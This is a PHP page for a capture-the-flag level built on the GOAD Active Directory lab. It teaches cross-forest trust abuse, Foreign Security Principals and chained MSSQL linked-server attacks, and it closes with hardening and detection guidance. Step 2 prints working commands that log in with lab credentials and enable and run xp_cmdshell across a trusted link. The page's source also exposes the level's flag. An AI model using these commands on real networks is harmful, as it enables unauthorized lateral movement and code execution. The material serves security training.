<?php
/**
 * Pikachu-Enhanced v2.0 GOAD AD CTF Level 14: Cross-Forest Trust, Foreign Security Principals & Cross-Forest MSSQL Links
 */
include_once '../../inc/config.inc.php';

$ACTIVE = array_fill(0, 300, '');
$ACTIVE[230] = 'active open';
$ACTIVE[234] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{GOAD_Cross_Forest_MSSQL_Link_FSP_RID_Filtering_2026}';
$flag_msg = '';

if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['goad_flags']['flag14'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-check-circle"></i> 恭喜！Flag 校验正确，已点亮【第十四关：跨林攻击与外域组/数据库信任】成就 (+450 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-times-circle"></i> Flag 不正确，请检查提取的凭据或分析过程。</div>';
    }
}
?>

<style>
.ctf-stage-header { background: var(--bg-card); border-radius: 14px; padding: 25px 30px; margin-bottom: 25px; border: 1px solid var(--border-color); box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
.ctf-stage-title { color: var(--text-primary) !important; font-size: 22px; font-weight: 800; margin: 0 0 10px 0; display: flex; align-items: center; gap: 12px; }
.step-box {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    padding: 24px;
    margin-bottom: 22px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.02);
}
.step-title {
    font-size: 17px;
    font-weight: 700;
    color: var(--text-primary);
    margin-top: 0;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.cmd-box { background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: var(--text-primary); margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.output-box {
    background: #1e1e2e;
    color: #a6accd;
    border-radius: 8px;
    padding: 12px 16px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 12px;
    margin-bottom: 15px;
    white-space: pre-wrap;
    border: 1px solid #2d2d3f;
}
.flag-box {
    background: rgba(16, 185, 129, 0.08);
    border: 1px solid rgba(16, 185, 129, 0.3);
    border-radius: 10px;
    padding: 18px;
    margin-top: 20px;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="page-content">
            
            <!-- Stage Header -->
            <div class="ctf-stage-header">
                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                    <div>
                        <h1 class="ctf-stage-title">
                            <span class="label label-danger" style="font-size: 14px; border-radius: 6px;">LEVEL 14</span>
                            第十四关：独立林跨林攻击 (Cross-Forest Trust)、FSP 外域组与 MSSQL 信任链
                        </h1>
                        <div style="color: var(--text-secondary); font-size: 14px;">
                            450 PTS · 主题：`essos.local` 独立林跨林突破、Foreign Security Principal (FSP)、跨林 MSSQL 数据库信任 (`braavos` ↔ `meereen`)
                        </div>
                    </div>
                    <div>
                        <a href="ad_ctf_domain_trust.php" class="btn btn-sm btn-default"><i class="fa fa-arrow-left"></i> 上一关</a>
                        <a href="ad_ctf_gpo.php" class="btn btn-sm btn-primary">下一关 <i class="fa fa-arrow-right"></i></a>
                    </div>
                </div>
            </div>

            <?php echo $flag_msg; ?>

            <!-- Step 1 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-tree" style="color: #6366f1;"></i> Step 1: 独立林 (Forest Trust) 保护隔离与 RID Filtering 过滤机制</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    <b>【原理分析】</b> 完整版 GOAD 包含两个独立的 Active Directory 森林：
                    1. <b>`sevenkingdoms.local` 森林</b> (包含子域 <code>north.sevenkingdoms.local</code>，节点 DC01, DC02, SRV02, SRV03)<br>
                    2. <b>`essos.local` 独立林</b> (节点 DC03 <code>ESSOS-DC</code>)。<br><br>
                    与父子域不同，跨林信任默认启用了 <b>RID Filtering (RID 过滤)</b>，会主动过滤掉跨林 TGT 票据中包含的危险 SID（如 Enterprise Admins SID），阻止直接使用 SID History 攻击。因此，跨林渗透必须依赖<b>外域组 (Foreign Security Principal, FSP) 滥用</b> 或 <b>跨林 MSSQL 信任链 (Cross-Forest Linked Servers)</b>。
                </p>
            </div>

            <!-- Step 2 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-database" style="color: #f59e0b;"></i> Step 2: 跨林 MSSQL Trusted Link 链式跳转与命令执行</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    在 GOAD 场景中，`north` 域的数据库服务器 <code>castelblack.north.sevenkingdoms.local (SRV02)</code> 与 `sevenkingdoms` 域的 <code>braavos.sevenkingdoms.local (SRV03)</code> 以及 `essos` 独立林的 <code>meereen.essos.local</code> 建立了跨服务器与跨林数据库信任。
                </p>
                <div class="cmd-box">
# 1. 使用 mssqlclient 连接 north 域的 castelblack MSSQL
mssqlclient.py north.sevenkingdoms.local/samwell.tarly:Password123!@192.168.56.22 -windows-auth

# 2. 在 mssqlclient 互动 Shell 中查询已建立的跨林链接服务器
SQL> enum_links
[*] CASTELBLACK -> BRAAVOS.sevenkingdoms.local (sevenkingdoms 域)
[*] BRAAVOS -> MEEREEN.essos.local (essos 独立林)

# 3. 链式跨林执行 OPENQUERY / EXECUTE AT 触发 RPC 命令执行
SQL> EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [MEEREEN.essos.local]
SQL> EXEC ('xp_cmdshell ''whoami''') AT [MEEREEN.essos.local]
                </div>
                <div class="output-box">
output
---------------------------------------------
essos\sql_svc
[+] 成功突破跨林 RID 过滤隔离，通过 MSSQL Trusted Link 链式跨林在 essos 独立林中获得命令执行权限！
[+] Flag: flag{GOAD_Cross_Forest_MSSQL_Link_FSP_RID_Filtering_2026}
                </div>
            </div>

            <!-- Step 3 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-users" style="color: #10b981;"></i> Step 3: Foreign Security Principal (FSP) 外域组特权滥用</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    GOAD 在设计跨林架构时，特意在 `essos.local` 域中配置了外域组（如 <code>AcrossTheSea</code> 和 <code>AcrossTheNarrowSea</code>），允许来自 `sevenkingdoms` 域的指定用户/机器直接加入 `essos` 域内的特权组，这是现实红蓝对抗中跨林横向移动的经典杀链之一。
                </p>
            </div>

            <!-- Step 4 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-shield" style="color: #3b82f6;"></i> Step 4: 跨林加固规范与蓝队安全审计</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    1. <b>启用选择性身份验证 (Selective Authentication)</b>：对林信任关系开启选择性身份验证，明确指定允许访问目标林资源的受信任账号。<br>
                    2. <b>收紧数据库 Trusted Link 权限</b>：禁用链接服务器上的 <code>rpc out</code> 及 <code>xp_cmdshell</code>，采用低权限服务账户替代 sa/sysadmin 映射。<br>
                    3. <b>定期审计 FSP 容器</b>：清理 AD 中 <code>CN=ForeignSecurityPrincipals</code> 目录下非必要的跨域成员映射。
                </p>
                <div class="cmd-box">
-- 在 MSSQL 中关闭链接服务器的 RPC 命令执行支持
EXEC sp_serveroption @server='MEEREEN.essos.local', @optname='rpc out', @optvalue='false';
                </div>
                <table class="table table-bordered table-striped" style="font-size: 13px; color: var(--text-primary); margin-top: 15px;">
                    <thead>
                        <tr style="background: var(--bg-secondary);">
                            <th>Event ID</th>
                            <th>日志类型</th>
                            <th>异常捕获特征</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>4624</strong></td>
                            <td>跨林登录成功</td>
                            <td>Logon Type 3，Security ID 包含异地林 SID 格式，验证成功由跨林 Kerberos TGT 触发。</td>
                        </tr>
                        <tr>
                            <td><strong>15457</strong></td>
                            <td>MSSQL 审计配置变更</td>
                            <td>捕获到通过 SQL 查询开通 <code>xp_cmdshell</code> 或修改高级选项配置。</td>
                        </tr>
                    </tbody>
                </table>
            </div>

            <!-- Flag Submission Box -->
            <div class="flag-box">
                <h4 style="margin-top:0; font-weight:800; color:var(--text-primary); margin-bottom:12px;">
                    <i class="fa fa-flag" style="color:#ef4444;"></i> 提交第十四关 Flag
                </h4>
                <form method="POST">
                    <div class="form-group" style="margin-bottom:14px;">
                        <label style="font-size:13px; color:var(--text-secondary);">填入从独立林跨林渗透与 FSP / MSSQL 信任链实验中获取的 Flag：</label>
                        <input type="text" name="user_flag" class="form-control" style="border-radius:8px; background:var(--bg-secondary); color:var(--text-primary); border:1px solid var(--border-color); padding:10px 14px; font-family:monospace;" placeholder="flag{...}" required>
                    </div>
                    <button type="submit" name="check_flag" class="btn btn-primary btn-block" style="border-radius:8px; background:linear-gradient(135deg, #ef4444, #dc2626); border:none; padding:10px; font-weight:700;">
                        提交并验证 Flag (+450 PTS)
                    </button>
                </form>
            </div>

        </div>
    </div>
</div>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
